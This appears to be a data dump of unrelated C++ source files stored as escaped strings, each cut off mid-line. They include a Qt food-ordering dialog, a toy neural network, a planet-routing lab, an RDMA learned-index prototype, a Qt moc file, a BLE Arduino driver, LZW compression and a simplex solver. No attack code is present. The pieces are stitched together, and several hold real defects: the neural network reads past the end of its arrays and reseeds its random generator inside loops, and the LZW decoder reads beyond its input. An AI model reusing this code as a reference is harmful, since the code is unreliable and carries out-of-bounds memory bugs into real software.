if (item && item->text() == id)\r\n        {\r\n            QMessageBox::information(this, \"\u52a0\u5165\u5931\u8d25\", \"\u5f53\u524d\u83dc\u54c1\u5df2\u5728\u60a8\u7684\u8ba2\u5355\u4e2d\uff0c\u8bf7\u76f4\u63a5\u4fee\u6539\u5b83~\");\r\n            return;\r\n        }\r\n    }\r\n\r\n    //\u6ca1\u6709\u5728\u5f53\u524d\u8ba2\u5355\u4e2d\uff0c\u63d2\u5165\r\n    QList<QStandardItem*> rowData;\r\n    //\"\u83dc\u54c1\u7f16\u53f7\", \"\u83dc\u54c1\u540d\u79f0\", \"\u83dc\u54c1\u5206\u7c7b\",\"\u83dc\u54c1\u4ef7\u683c\",\"\u4efd\u6570\",\"\u8981\u6c42\"\r\n    if(ui->token_dishnum->text() != \"\"){\r\n        rowData << new QStandardItem(ui->token_dishid->toPlainText())\r\n                << new QStandardItem(ui->token_dishname->toPlainText())\r\n                << new QStandardItem(ui->token_dishtype->toPlainText())\r\n                << new QStandardItem(ui->token_dishprice->toPlainText())\r\n                << new QStandardItem(ui->token_dishnum->text())\r\n                << new QStandardItem(ui->Demand->text());\r\n        order.appendRow(rowData);\r\n        rowData.clear();\r\n    }\r\n    else{\r\n        QMessageBox::information(this, \"\u63d2\u5165\u5931\u8d25\", \"\u8bf7\u8f93\u5165\u70b9\u9910\u4efd\u6570~\");\r\n    }\r\n\r\n    ui->order_now->setModel(&order);\r\n}\r\n\r\n// \u4fee\u6539\u5f53\u524d\u8ba2\u5355\u884c\r\nvoid Token_order::o",
    "#include <iostream>\n#include <ctime>\n#include <string>\nusing namespace std;\n\nconst int hiddenLayerNodes = 6;\n\ndouble input[2];\ndouble firstLayerWeights[12];\ndouble hiddenLayerBiases[hiddenLayerNodes];\ndouble secondLayerWeights[24];\ndouble outputLayerBiases[4];\n\ndouble firstCalculations[12];\ndouble secondCalculations[hiddenLayerNodes];\ndouble thirdCalculations[24];\n\ndouble firstOutputCalculations[6];\ndouble secondOutputCalculations[6];\ndouble thirdOutputCalculations[6];\ndouble fourthOutputCalculations[6];\n\ndouble outputCalculations[4];\n\n// when training is finished, add a function to display all weights and biases on a seperate file\n// function for backpropogation\n\nvoid randomInitialisation();\nvoid hiddenLayerCalculations(int nodes);\ndouble compareOutput(double outputCalcs[]);\n\n\nint main(int argc, char *argv[]) \n{\n\n    cout << \"What is your first input?\" << endl;\n    cout << \"Note: it must be either 1 or 0\" << endl;\n    cin >> input[0];\n\n    cout << \"What is your second input?\" << endl;\n    cin >> input[1];\n\n    if(input[0] != 1) {\n        if(input[0] != 0) {\n            cout << \"Error: a number besides 1 or 0 has been picked\";\n            return 0;\n        }\n    }\n\n    if(input[1] != 1) {\n        if(input[1] != 0) {\n            cout << \"Error: a number besides 1 or 0 has been picked\";\n            return 0;\n        }\n    }\n\n    // continue\n\n    // ------------------------------------------------------------------------------------------------------------\n    // initialise random weights and biases' to make the neural network 'guess' the best settings to then train it\n    // ------------------------------------------------------------------------------------------------------------\n    randomInitialisation();\n\n    // calculate the mathematics behind the hidden layer\n    hiddenLayerCalculations(hiddenLayerNodes);\n\n    // compare all four outputs and print the highest one\n    compareOutput(outputCalculations);\n\n    // backpropogation algorithm to 'train' AI by tweaking the weights and biases to get a better result\n    // yet to be made\n\n    return 0;\n}\n\n\n\nvoid randomInitialisation() \n{\n    // sets firstLayerWeights weights\n    for(int i = 0; i < 12; i++) {\n        srand(time(NULL));\n        firstLayerWeights[i] = rand() % 10 + 1;\n    }\n\n    // sets hiddenLayerBiases biases\n    for(int i = 0; i < hiddenLayerNodes; i++) {\n        srand(time(NULL));\n        hiddenLayerBiases[i] = rand() % 10 + 1;\n    }\n\n    // sets secondLayerWeights weights\n    for(int i = 0; i < 24; i++) {\n        srand(time(NULL));\n        secondLayerWeights[i] = rand() % 10 + 1;\n    }\n\n    // sets outputLayerBiases biases\n    for(int i = 0; i < 4; i++) {\n        srand(time(NULL));\n        outputLayerBiases[i] = rand() % 10 + 1;\n    }\n}\n\nvoid hiddenLayerCalculations(int nodes) \n{\n    // the 1 / (1 + exp(-(input))) is the an activation function under the name of a sigmoid function\n    // it puts every value between 0 and 1, along with turning negative values to positive values\n    \n    // calculating with weights (input x weight)\n    for(int i = 0; i < (12 / 2); i++) {\n        firstCalculations[i] = 1 / (1 + exp(-(input[1] * firstLayerWeights[i])));\n    }\n\n    cout << endl;\n\n    for(int i = 0; i < (12 / 2); i++) {\n        firstCalculations[i+6] = 1 / (1 + exp(-(input[2] * firstLayerWeights[i+6])));\n    }\n\n    // calculating the biases ((input x weightj) + (input x weighti) + bias)\n    for(int i = 0; i < hiddenLayerNodes; i++) {\n       secondCalculations[i] = 1 / (1 + exp(-(hiddenLayerBiases[i] + firstCalculations[i] + firstCalculations[i+6])));\n    }\n\n    // calculating output weights (secondcalculations x weight)\n    for(int i = 0; i < hiddenLayerNodes; i++) {\n        firstOutputCalculations[i] = 1 / (1 + exp(-(secondCalculations[i] * secondLayerWeights[i])));\n    }\n    \n    for(int i = 0; i < hiddenLayerNodes; i++) {\n        secondOutputCalculations[i] = 1 / (1 + exp(-(secondCalculations[i] * secondLayerWeights[i+6])));\n    }\n\n    for(int i = 0; i < hiddenLayerNodes; i++) {\n        thirdOutputCalculations[i] = 1 / (1 + exp(-(secondCalculations[i] * secondLayerWeights[i+12])));\n    }\n\n    for(int i = 0; i < hiddenLayerNodes; i++) {\n        fourthOutputCalculations[i] = 1 / (1 + exp(-(secondCalculations[i] * secondLayerWeights[i+18])));\n    }\n\n    // compare each output to see which one is highest\n    for(int i = 0; i < 4; i++) {\n        outputCalculations[i] = 1 / (1 + exp(-(firstOutputCalculations[i] + secondOutputCalculations[i+6] + thirdOutputCalculations[i+12] + fourthOutputCalculations[i+18] + outputLayerBiases[i])));\n    }\n\n\n    \n}\n\ndouble compareOutput(double outputCalcs[]) \n{\n    int index;\n    double o = 0;\n\n    for(int i = 0; i < 4; i++) {\n        if(outputCalcs[i] > o) {\n            o = outputCalcs[i];\n            index = i;\n        }\n    }\n\n    if(index == 0) {\n        cout << \"AI chose the sequence (1, 0)\";\n    }\n\n    if(index == 1) {\n        cout << \"AI chose the sequence (0, 1)\";\n    }\n\n    if(index == 2) {\n        cout << \"AI ch",
    "// Name: Sujoy Barua\r\n// Lab Section: 020\r\n// Date Submitted: 12/02/2021\r\n\r\n//add all the libraries and namespace std\r\n\r\n#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include <fstream>\r\n#include <cmath>\r\n\r\nusing namespace std;\r\n\r\n\r\n//creating necesary structs\r\n\r\nstruct Location {\r\n    int gridRow;\r\n    int gridCol;\r\n    int sRow;\r\n    int sCol;\r\n    int eRow;\r\n    int eCol;\r\n        \r\n};\r\n\r\nstruct Planet {\r\n    int Row;\r\n    int Col;\r\n    char Sym;\r\n    int Id;\r\n    string Name;\r\n};\r\n\r\n\r\nint main() {\r\n    \r\n    //prompting user for input file names and storing them to variables\r\n    string locFile;\r\n    string namesFile;\r\n    cout << \"Enter Locations Filename: \";\r\n    cin >> locFile;\r\n    cout << \"Enter Names Filename: \";\r\n    cin >> namesFile;\r\n\r\n    //opening streams for inputted ( by user ) files\r\n    ifstream locIn(locFile);\r\n    if (!locIn.is_open()) {\r\n        cout << \"Input file could not be opened\" <<endl;\r\n        return 1;\r\n    }\r\n    ifstream nameIn(namesFile);\r\n    if (!nameIn.is_open()) {\r\n        cout << \"Input file could not be opened\" <<endl;\r\n        return 1;\r\n    }\r\n    \r\n    //reading in the locaton file\r\n    Location location;\r\n    locIn >> location.gridRow >> location.gridCol >> location.sRow >> location.sCol >> location.eRow >> location.eCol;\r\n    \r\n    Planet planet;\r\n    vector<Planet> planetVec;\r\n    while (locIn >> planet.Row >> planet.Col >> planet.Sym >> planet.Id) {\r\n        if (planet.Row <= location.gridRow && planet.Col <= location.gridCol && planet.Row > 0 && planet.Col > 0) {\r\n            planetVec.push_back(planet);\r\n        } else {\r\n            cout << planet.Id << \" out of range - ignoring\" << endl;\r\n        }\r\n        \r\n       \r\n    }\r\n\r\n    //reading in planet names to Planet struct where id is matching\r\n    int planetID;\r\n    string planetName;\r\n    while (nameIn >> planetID >> planetName) {\r\n        for (size_t i = 0; i < planetVec.size(); ++i) {\r\n            if (planetVec.at(i).Id == planetID) {\r\n                planetVec.at(i).Name = planetName;\r\n            }\r\n        }\r\n    }\r\n\r\n    //closing input streams\r\n    locIn.close();\r\n    nameIn.close();\r\n\r\n    //cleaning the names by removing XX and replacing _ with blank space\r\n    for (size_t i = 0; i < planetVec.size(); ++i) {\r\n        \r\n        while (planetVec.at(i).Name.find(\"XX\") != string::npos) {\r\n            int index = planetVec.at(i).Name.find(\"XX\");\r\n            planetVec.at(i).Name.erase(planetVec.at(i).Name.begin() + index, planetVec.at(i).Name.begin() + index + 2);\r\n        }\r\n\r\n        while (planetVec.at(i).Name.find(\"_\") != string::npos) {\r\n            int index = planetVec.at(i).Name.find(\"_\");\r\n            planetVec.at(i).Name.replace(index, 1, \" \");\r\n        }\r\n    }\r\n\r\n    //create a map filled with number of periods equal to the number of rows and columns within the driver's range\r\n    vector<string> periods(location.gridCol, \".\");\r\n    vector<vector<string> > map(location.gridRow, periods);\r\n\r\n    //replace periods with appropriate symbols\r\n    map.at(location.sRow-1).at(location.sCol-1) = \"S\";\r\n    map.at(location.eRow-1).at(location.eCol-1) = \"E\";\r\n\r\n    for (size_t i = 0; i < planetVec.size(); ++i) {\r\n        map.at((planetVec.at(i).Row)-1).at((planetVec.at(i).Col)-1) = planetVec.at(i).Sym;\r\n    }\r\n        \r\n\r\n\r\n\r\n    //create output stream\r\n    ofstream fout(\"journey.txt\");\r\n\r\n    //output the map to output stream\r\n    for (size_t i = 0; i < map.size(); ++i) {\r\n        for (size_t j = 0; j < map.at(i).size(); ++j) {\r\n            fout << map.at(i).at(j);\r\n        }\r\n        fout << endl;\r\n    }\r\n    \r\n    //plan the route to take\r\n    int currentLocRow = location.sRow;\r\n    int currentLocCol = location.sCol;\r\n    int potentialLocRow;\r\n    int potentialLocCol;\r\n    int actualLocRow;\r\n    int actualLocCol;\r\n    double nDist;\r\n    double oDist = 10000;\r\n    int minIndex = 0;\r\n    vector<string> visited (planetVec.size(), \"false\");\r\n\r\n    //output start location\r\n    fout << \"Start at \" << currentLocRow << \" \" << currentLocCol << endl;\r\n    \r\n    //loop that calculates distance and determines which planet to go next\r\n    //runs until all planets have been visited\r\n    for (size_t i = 0; i < planetVec.size(); ++i) {\r\n        oDist = 10000;\r\n            for (size_t j = 0; j < visited.size(); ++j) {\r\n                if (visited.at(j) == \"false\") {\r\n                    potentialLocRow = planetVec.at(j).Row;\r\n                    potentialLocCol = planetVec.at(j).Col;\r\n                    nDist = sqrt(pow((currentLocRow - potentialLocRow),2) + pow((currentLocCol - potentialLocCol),2));\r\n                    //runs if new distance is less than old distance\r\n                    if (nDist < oDist) {\r\n                        oDist = nDist;\r\n                        minIndex = j;\r\n                        actualLocRow = planetVec.at(minIndex).Row;\r\n                        actualLocCol = planetVec.at(minIndex).Col;\r\n                    }\r\n                    //runs if new distance is equal to ol",
    "//\u8fd9\u4e00\u7248\u9700\u8981\u5728submodel\u91cc\u8bbe\u7f6e1024\u957f\u5ea6\u7684huge_page\u548c2048\u957f\u5ea6\u7684huge_page+512 uint64\u957f\u5ea6\u7684stash\r\n\r\n#include \"LC.h\"\r\n#include \"HotBuffer.h\"\r\n#include \"IndexCache.h\"\r\n#include \"RdmaBuffer.h\"\r\n#include \"Timer.h\"\r\n\r\n\r\n#include <algorithm>\r\n#include <city.h>\r\n#include <iostream>\r\n#include <queue>\r\n#include <utility>\r\n#include <vector>\r\n#include <unordered_map>\r\n#include <map>\r\nLC::LC(DSM *dsm):dsm(dsm),LC_id(0){\r\n        assert(dsm->is_register());\r\n        auto page_buffer = (dsm->get_rbuf(0)).get_page_buffer(); \r\n        auto root_addr = dsm->alloc(kLeafPageSize);\r\n        auto root_page = new (page_buffer) LeafPage;\r\n        auto &r = root_page->records[3];\r\n        r.value=15;\r\n        root_page->set_consistent();\r\n        dsm->write_sync(page_buffer, root_addr, kLeafPageSize); \r\n        auto page_buffer_read = (dsm->get_rbuf(1)).get_page_buffer(); \r\n        dsm->read_sync(page_buffer_read, root_addr, kLeafPageSize, nullptr);\r\n        auto read_page=(LeafPage *)page_buffer_read;\r\n        auto &r2 = read_page->records[3];\r\n        std::cout<<r2.value<<std::endl;  \r\n        GlobalAddress root_ptr_ptr=get_root_ptr_ptr();\r\n\r\n\r\n        if(dsm->getMyNodeID()==0){  //\u7531\u96c6\u7fa4\u8282\u70b90\u53d1\u8d77bulk_loading\u64cd\u4f5c\r\n           //\u8fdb\u884cbulk_loading\u64cd\u4f5c, \u672c\u7aef\u52a0\u8f7d\u4e00\u5806\u5185\u5bb9\uff0c\u7136\u540e\u6392\u5e8f\uff0c\u91cd\u8bad\u7ec3\uff0c\u5c06\u6392\u5e8f\u540e\u7684KV\u5199\u5230\u8fdc\u7aefDSM\u91cc\uff0c\u4e4b\u540e\u5206\u914d\u5f97\u5230Index\u7684lowwer_bound\u5185\u5bb9\u5e76\u5199\u5165\r\n           //\u6ce8\u610flower_bound\u4f1a\u5212\u5206\u597dLeaf_node\u7684\u533a\u57df\uff0c\u7136\u540e\u5c06\u8fd9\u4e9b\u5730\u5740\u4f5c\u4e3a\u6307\u9488\u8df3\u8f6c\u9879\uff0c\u4e00\u5e76\u5199\u5165\r\n           //\u4e4b\u540e\u5206\u914dUpper_bound\uff0c\u5e76\u6309\u7167\u76f8\u540c\u529e\u6cd5\u5199\u5165\r\n           uint64_t epsilon=16;\r\n           PLR *plr=new PLR(epsilon-1);\r\n           this->load_data();\r\n           std::sort(exist_keys.begin(), exist_keys.end());\r\n           exist_keys.erase(std::unique(exist_keys.begin(), exist_keys.end()), exist_keys.end());\r\n           std::sort(exist_keys.begin(), exist_keys.end());\r\n           std::cout<<\"used \"<<exist_keys.size()<<\" keys. and epsilon is:\"<<epsilon<<std::endl;\r\n           uint64_t p=exist_keys[0];\r\n           size_t pos=0;\r\n           plr->add_point(p,pos);\r\n           auto k_iter = exist_keys.begin();\r\n           auto v_iter = exist_keys.begin();\r\n          // std::cout<<sizeof(PLR)<<std::endl;\r\n           for(int i=1; i<exist_keys.size(); i++) {\r\n            uint64_t next_p = exist_keys[i];\r\n            if (next_p == p){\r\n                //LOG(5)<<\"DUPLICATE keys\";\r\n                exit(0);\r\n            }\r\n            p = next_p;\r\n            pos++;\r\n            \r\n            if(!plr->add_point(p, pos)||i==exist_keys.size()-1){   //\u5982\u679cadd_point\u5931\u8d25\uff0c\u5219\u6267\u884c\u4e0b\u9762\u7684\u64cd\u4f5c     \r\n              //  std::cout<<\"i=\"<<i<<std::endl;       \r\n                auto cs = plr->get_segment();\r\n                std::pair<long double, long double>  cs_param= cs.get_slope_intercept(); \r\n\r\n                append_model(cs_param.first, cs_param.second, k_iter, v_iter, pos);    //\u5f85\u5199\r\n                \r\n                k_iter += pos;\r\n                v_iter += pos;\r\n                pos=0;\r\n                delete plr;\r\n                PLR *plr = new PLR(epsilon-1);\r\n              //  std::cout<<\"here we start new PLR model\"<<std::endl;\r\n                plr->add_point(p, pos);\r\n               // std::cout<<\"i=\"<<i<<std::endl;\r\n               // std::cout<<\"used \"<<exist_keys.size()<<\" keys.\"<<std::endl;\r\n            }\r\n        }\r\n           // models.train_up();\r\n            std::cout<<\"used down models:\"<<models.down.size()<<std::endl;\r\n            std::cout<<\"used up models:\"<<models.up.size()<<std::endl;\r\n           \r\n\r\n\r\n            \r\n            //\u4ee5\u4e0a\u4e3abulk_loading\u90e8\u5206\r\n\r\n        }\r\n        dsm->barrier(\"bulk_loading\");\r\n        printf(\"bulk_loading over.But lack of push to remote.\\n\");\r\n\r\n        if(dsm->getMyNodeID()!=0){  //\u8fd9\u91cc\u662f\u975e\u8282\u70b90\u7684\u8282\u70b9\u53d1\u8d77\u62c9\u53d6\u540c\u6b65\u7684\u64cd\u4f5c\r\n            //\u8282\u70b9\u62c9\u53d6bulk_loading\u7684index\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n        }\r\n        dsm->barrier(\"LI_sync\"); //\u81f3\u6b64\u5b8c\u6210bulk_loading\u9636\u6bb5\r\n        std::cout<<\"everything ok\"<<std::endl;\r\n        std::cout<<\"below is lower models prediction collision:\"<<std::endl;\r\n        std::map<int,int>::iterator it;\r\n        for(it=total_times.begin();it!=total_times.end();it++){\r\n            std::cout<<it->first<<\" collisons accurs: \"<<it->second<<std::endl;\r\n        }\r\n        int stash_num=0;\r\n        for(int i=0;i<models.down.size();i++){\r\n            std::cout<<\"now the stash loc is: \"<<models.down[i].leaf_backup->stash_loc<<std::endl;\r\n        }\r\n        for(int i=0;i<nonexist_keys.size();i++){\r\n            uint64_t key_test=nonexist_keys[i];\r\n           int loc_test;\r\n           for(int i=0;i<models.up.size();i++){\r\n            if(models.up[i].anchor_key>key_test){\r\n                loc_test=(int)(models.up[i].slope*(double)(key_test)+models.up[i].intercept);\r\n               //  std::cout<<\"loc_test is :\"<<loc_test<<std::endl;\r\n                break;\r\n            }\r\n           }\r\n          \r\n        //   int p=loc_test-16>=0?loc_test-16:0;\r\n         //  int end=loc_test+16<models.down.size()?loc_test+16:models.down.size();\r\n        //   for(;p<end;p++){\r\n            for(int p=loc_test-8;p<=loc_test+8;p++){\r\n            bool is_insert=false;\r\n            if(models.down[p].anchor_key>key_test){\r\n                std::cout",
    "/****************************************************************************\r\n** Meta object code from reading C++ file 'selectrectwidget.h'\r\n**\r\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.8.0)\r\n**\r\n** WARNING! All changes made in this file will be lost!\r\n*****************************************************************************/\r\n\r\n#include \"../../../selectrectwidget.h\"\r\n#include <QtGui/qtextcursor.h>\r\n#include <QtCore/qmetatype.h>\r\n\r\n#include <QtCore/qtmochelpers.h>\r\n\r\n#include <memory>\r\n\r\n\r\n#include <QtCore/qxptype_traits.h>\r\n#if !defined(Q_MOC_OUTPUT_REVISION)\r\n#error \"The header file 'selectrectwidget.h' doesn't include <QObject>.\"\r\n#elif Q_MOC_OUTPUT_REVISION != 68\r\n#error \"This file was generated using the moc from 6.8.0. It\"\r\n#error \"cannot be used with the include files from this version of Qt.\"\r\n#error \"(The moc has changed too much.)\"\r\n#endif\r\n\r\n#ifndef Q_CONSTINIT\r\n#define Q_CONSTINIT\r\n#endif\r\n\r\nQT_WARNING_PUSH\r\nQT_WARNING_DISABLE_DEPRECATED\r\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\r\nnamespace {\r\n\r\n#ifdef QT_MOC_HAS_STRINGDATA\r\nstruct qt_meta_stringdata_CLASSSelectRectWidgetENDCLASS_t {};\r\nconstexpr auto qt_meta_stringdata_CLASSSelectRectWidgetENDCLASS = QtMocHelpers::stringData(\r\n    \"SelectRectWidget\"\r\n);\r\n#else  // !QT_MOC_HAS_STRINGDATA\r\n#error \"qtmochelpers.h not found or too old.\"\r\n#endif // !QT_MOC_HAS_STRINGDATA\r\n} // unnamed namespace\r\n\r\nQ_CONSTINIT static const uint qt_meta_data_CLASSSelectRectWidgetENDCLASS[] = {\r\n\r\n // content:\r\n      12,       // revision\r\n       0,       // classname\r\n       0,    0, // classinfo\r\n       0,    0, // methods\r\n       0,    0, // properties\r\n       0,    0, // enums/sets\r\n       0,    0, // constructors\r\n       0,       // flags\r\n       0,       // signalCount\r\n\r\n       0        // eod\r\n};\r\n\r\nQ_CONSTINIT const QMetaObject SelectRectWidget::staticMetaObject = { {\r\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\r\n    qt_meta_stringdata_CLASSSelectRectWidgetENDCLASS.offsetsAndSizes,\r\n    qt_meta_data_CLASSSelectRectWidgetENDCLASS,\r\n    qt_static_metacall,\r\n    nullptr,\r\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSSelectRectWidgetENDCLASS_t,\r\n        // Q_OBJECT / Q_GADGET\r\n        QtPrivate::TypeAndForceComplete<SelectRectWidget, std::true_type>\r\n    >,\r\n    nullptr\r\n} };\r\n\r\nvoid SelectRectWidget::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\r\n{\r\n    (void)_o;\r\n    (void)_id;\r\n    (void)_c;\r\n    (void)_a;\r\n}\r\n\r\nconst QMetaObject *SelectRectWidget::metaObject() const\r\n{\r\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\r\n}\r\n\r\nvoid *SelectRectWidget::qt_metacast(const char *_clname)\r\n{\r\n    if (!_clname) return nullptr;\r\n    if (!strcmp(_clname, qt_meta_stringdata_CLASSSelectRectWidgetENDCLASS.stringdata0))\r\n        return static_cast<void*>(this);\r\n    return QWidget::qt_metacast(_clname);\r\n}\r\n\r\nint SelectRectWidget::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\r\n{\r\n    _id = QWidget::qt_metacall(_c, _id, _a);\r\n    return _id;\r\n}\r\nQT_WARNING_POP\r\n",
    "#if defined(ARDUINO_SAMD_MKR1000) || defined(ARDUINO_SENSEBOX_MCU_ESP32S2) || defined(ARDUINO_SAMD_MKRZERO)\n\n#include \"phyphoxBle.h\"\n#include \"NINAB31serial.h\"\n#include \"Arduino.h\"\n#include <stdio.h>\n/*\nBLEService PhyphoxBLE::phyphoxExperimentService{phyphoxBleExperimentServiceUUID}; // create service\nBLECharacteristic PhyphoxBLE::experimentCharacteristic{phyphoxBleExperimentCharacteristicUUID, BLERead | BLEWrite| BLENotify, 20, false};\nBLECharacteristic PhyphoxBLE::controlCharacteristic{phyphoxBleExperimentControlCharacteristicUUID, BLERead | BLEWrite| BLENotify, 20, false};\n\nBLEService PhyphoxBLE::phyphoxDataService{phyphoxBleDataServiceUUID}; // create service\nBLECharacteristic PhyphoxBLE::dataCharacteristic{phyphoxBleDataCharacteristicUUID, BLERead | BLEWrite | BLENotify, 20, false};\nBLECharacteristic PhyphoxBLE::configCharacteristic{phyphoxBleConfigCharacteristicUUID, BLERead | BLEWrite| BLENotify, 20, false};\n*/\nuint16_t PhyphoxBLE::minConInterval = 12;  //7.5ms\nuint16_t PhyphoxBLE::maxConInterval = 48; //30ms\nuint16_t PhyphoxBLE::slaveLatency = 0;\nuint16_t PhyphoxBLE::timeout = 50;\n\nuint16_t PhyphoxBLE::MTU = 20;\nuint16_t PhyphoxBleExperiment::MTU = 20;\n\nint PhyphoxBLE::h_phyphoxExperimentService=0;\nint PhyphoxBLE::h_experimentCharacteristic=0;\nint PhyphoxBLE::h_controlCharacteristic=0;\n\nint PhyphoxBLE::h_phyphoxDataService=0;\nint PhyphoxBLE::h_dataCharacteristic=0;\nint PhyphoxBLE::h_configCharacteristic=0;\n\nbool PhyphoxBLE::exploaded=false;\n\nuint8_t* PhyphoxBLE::data = nullptr; //this pointer points to the data the user wants to write in the characteristic\nuint8_t* PhyphoxBLE::p_exp = nullptr; //this pointer will point to the byte array which holds an experiment\n\nsize_t PhyphoxBLE::expLen = 0; //try o avoid this maybe use std::array or std::vector\nuint8_t PhyphoxBLE::EXPARRAY[4000] = {0};// block some storage\n\nuint8_t PhyphoxBLE::controlCharValue[21]={0};\nuint8_t PhyphoxBLE::configCharValue[21]={0};\n\n\n\nvoid(*PhyphoxBLE::configHandler)() = nullptr;\n\nvoid PhyphoxBLE::start(const char* DEVICE_NAME, uint8_t* exp_pointer, size_t len){\n  p_exp = exp_pointer;\n  expLen = len;\n  start(DEVICE_NAME);\n}\n\nvoid PhyphoxBLE::start(uint8_t* exp_pointer, size_t len){\n  p_exp = exp_pointer;\n  expLen = len;\n  start();\n}\n\nvoid PhyphoxBLE::start(const char* DEVICE_NAME)\n{\n    port.begin();\n    port.stopAdvertise();\n\n    port.checkResponse(\"AT+UBTAD=020A0605121800280011074A5153BA405E438B7146F7300100DFCD\",1000);\n    h_phyphoxExperimentService=port.parseResponse(\"AT+UBTGSER=CDDF000130F746718B435E40BA53514A\",1000);\n    h_controlCharacteristic=port.parseResponse(\"AT+UBTGCHA=CDDF000330F746718B435E40BA53514A,1a,1,1\",1000);\n    h_experimentCharacteristic=port.parseResponse(\"AT+UBTGCHA=CDDF000230F746718B435E40BA53514A,1a,1,1\",1000);\n\n    h_phyphoxDataService=port.parseResponse(\"AT+UBTGSER=CDDF100130F746718B435E40BA53514A\",1000);\n    h_dataCharacteristic=port.parseResponse(\"AT+UBTGCHA=CDDF100230F746718B435E40BA53514A,1a,1,1\",1000);\n    h_configCharacteristic=port.parseResponse(\"AT+UBTGCHA=CDDF100330F746718B435E40BA53514A,1a,1,1\",1000);\n\n\n\n\tif(p_exp == nullptr){\n\n      PhyphoxBleExperiment defaultExperiment;\n\n      //View\n      PhyphoxBleExperiment::View firstView;\n\n      //Graph\n      PhyphoxBleExperiment::Graph firstGraph;      //Create graph which will plot random numbers over time\n      firstGraph.setChannel(0,1);\n\n      firstView.addElement(firstGraph);\n      defaultExperiment.addView(firstView);\n\n     addExperiment(defaultExperiment);\n  }\n\n\n\n\n  // set connection parameter\n  port.setConnectionInterval(minConInterval, maxConInterval);\n  port.checkResponse(\"AT+UBTAD=020A0605121800280011074A5153BA405E438B7146F7300100DFCD\",1000);\n  port.advertise();\n  port.setLocalName(DEVICE_NAME);\n\n}\n\nvoid PhyphoxBLE::start() {\n    PhyphoxBLE::start(\"phyphox-senseBox\");\n}\n\n\nvoid PhyphoxBLE::poll(int timeout)\n{\n  auto starttime=millis();\n  while(millis()-starttime<timeout){\n    poll();\n    delay(5);\n  }\n}\n\nvoid PhyphoxBLE::read(uint8_t *arrayPointer, unsigned int arraySize)\n{\n  memcpy(arrayPointer, configCharValue, arraySize);\n  //configCharacteristic.readValue(arrayPointer, arraySize);\n}\n\nvoid PhyphoxBLE::read(float& f)\n{\n  //uint8_t readDATA[4];\n  //configCharacteristic.readValue(readDATA, 4);\n  memcpy(&f,configCharValue,4);\n}\n\nvoid PhyphoxBLE::addExperiment(PhyphoxBleExperiment& exp)\n{\n  char buffer[2500] =\"\";\n  uint16_t length = 0;\n\n\texp.getFirstBytes(buffer, deviceName);\n\tmemcpy(&EXPARRAY[length],&buffer[0],strlen(buffer));\n  length += strlen(buffer);\n  memset(&(buffer[0]), NULL, strlen(buffer));\n\n  for(uint8_t i=0;i<phyphoxBleNViews; i++){\n    for(int j=0; j<phyphoxBleNElements; j++){\n      exp.getViewBytes(buffer,i,j);\n\t    memcpy(&EXPARRAY[length],&buffer[0],strlen(buffer));\n      length += strlen(buffer);\n      memset(&(buffer[0]), NULL, strlen(buffer));\n    }\n  }\n  exp.getLastBytes(buffer);\n\n\tmemcpy(&EXPARRAY[length],&buffer[0],strlen(buffer));\n  length += strlen(buffer);\n\tp_exp = &EXPARRAY[0];\n\texpLen = length;\n}\n\n\nvoid PhyphoxBLE::wri",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\nvector<int> encoding(string s1)\n{\n    cout << \"encoding the string\" << endl;\n    unordered_map<string, int> table;\n    for (int i = 0; i < 255; i++)\n    {\n        string ch = \"\";\n        ch += char(i);\n        table[ch] = i;\n    }\n    string p = \"\", c = \"\";\n    p += s1[0];\n    int code = 256;\n    vector<int> output_code;\n    cout << \"string\\toutput_code\\tAddition\" << endl;\n    for (int i = 0; i < s1.length(); i++)\n    {\n        if (i != s1.length() - 1)\n            c += s1[i + 1];\n        if (table.find(p + c) != table.end())\n            p = p + c;\n        else\n        {\n            cout << p << \"\\t\" << table[p] << \"\\t\" << p + c << \"\\t\" << code << endl;\n            output_code.push_back(table[p]);\n            table[p + c] = code;\n            code++;\n            p = c;\n        }\n        c = \"\";\n    }\n    cout << p << \"\\t\" << table[p] << endl;\n    output_code.push_back(table[p]);\n    return output_code;\n}\n\nvoid decoding(vector<int> op)\n{\n    cout << \"\\nDecoding\\n\";\n    unordered_map<int, string> table;\n    for (int i = 0; i < 255; i++)\n    {\n        string ch = \"\";\n        ch += char(i);\n        table[i] = ch;\n    }\n    int old = op[0], n = 0;\n    string s = table[old];\n    string c = \"\";\n    c += s[0];\n    cout << s;\n    int count = 256;\n    for (int i = 0; i < op.size(); i++)\n    {\n        n = op[i + 1];\n        if (table.find(n) == table.end())\n        {\n            s = table[old];\n            s = s + c;\n        }\n        else\n        {\n            s = table[n];\n        }\n        cout << s;\n        c = \"\";\n        c += s[0];\n        table[count] = table[old] + c;\n        count++;\n        old = n;\n    }\n}\n\nint main()\n{\n    string s = \"WYS*WYGWYS*WYSWYSG\";\n    vector<int> output_code = encoding(s);\n    cout << \"output_code are:\";\n    for (int i = 0; i < output_code.size(); i++)\n    {\n        cout << output_code[i] << \" \";\n    }\n    cout << endl;\n    decoding(output_code);\n}",
    "#include <iostream> // libreria para imprimir en consola\n\nusing namespace std;\n// JORGE GUILLERMO OLARTE QUISPE\nconst int numRestricciones = 2; // N\u00famero de restricciones (si se usa otro valor asegure cambiar la tabla)\nconst int numVariables = 2; // N\u00famero de variables(si se usa otro valor asegure cambiar la tabla)\n\n// Funci\u00f3n para imprimir el tableau\nvoid imprimirTabla(double tabla[numRestricciones + 1][numVariables + numRestricciones + 1]) {\n    // Iterar sobre cada fila de la tabla\n    for (int i = 0; i < numRestricciones + 1; ++i) {\n        // Iterar sobre cada columna de la tabla\n        for (int j = 0; j < numVariables + numRestricciones + 1; ++j) {\n            // Imprimir el valor de la tabla con un ancho fijo\n            cout << \" \" << tabla[i][j] << \" \";\n        }\n        // Agregar una nueva l\u00ednea despu\u00e9s de imprimir cada fila\n        cout << endl;\n    }\n    // Imprimir una l\u00ednea en blanco despu\u00e9s de imprimir la tabla completa\n    cout << endl;\n}\n\n// Funci\u00f3n para realizar el algoritmo simplex\nvoid 